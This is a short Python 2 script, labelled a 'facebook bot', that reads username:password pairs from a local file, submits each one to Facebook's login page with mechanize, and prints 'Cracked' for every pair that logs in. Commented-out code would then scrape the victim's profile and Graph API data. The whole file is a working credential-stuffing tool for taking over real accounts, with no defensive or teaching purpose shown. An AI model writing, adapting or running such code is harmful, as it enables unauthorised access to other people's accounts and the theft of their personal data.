#!/usr/bin/env python

# this is a facebook bot 

import mechanize, cookielib, urllib2, json, getpass
from bs4 import BeautifulSoup
import time

# initialising login values
print "This is a simple facebook bot"

#user = raw_input(' Username : ')
#print ' (Note -> Password will not be echoed)'
#passwd = getpass.getpass(' Password : ')
#logged = False

lines = open('/home/mohamed/brutefb.txt', 'r').readlines()
for line in lines:
	try:
		elem = line.split(':')
		user = elem[0]
		passwd = elem[1]
	
		br = mechanize.Browser()
		br.set_handle_robots(False)
		br.set_handle_redirect(True)
		#br.set_handle_gzip(True)
		
		cj = cookielib.LWPCookieJar()
		br.set_cookiejar(cj)
		br.open('https://www.facebook.com/login.php')
		br.select_form(nr=0)
		br.form['email'] = user
		br.form['pass'] = passwd
		br.submit()
		welcome = br.geturl()
		print welcome
		if 'https://www.facebook.com/login.php' not in  welcome:
			#logged = True
			print ' [*] Cracked %s:%s' % (user, passwd)	
	
		#time.sleep(1.6)
	except:
		pass
	#if logged:
	#	html = br.response().read()
	#	soup = BeautifulSoup(html, 'html')
		# getting my url example www.fb.com/matrixcoedr2
	#	mylink = soup.find('a', class_='_2dpe _1ayn')['href'].split('/')[3]

		# getting facebook graph
	#	graphdata = urllib2.urlopen('http://graph.facebook.com/'+mylink).read()
	#	data = json.loads(graphdata)
	#	print " ID : %s\n Username : %s\n Name : %s\n Gender : %s\n" % (data['id'], data['username'], data['name'], data['gender'])
	
		# Getting the friends list
	

# print response
#for line in br.response().readlines():
#	print line

# view forms
#for form in br.forms():
#	print form 
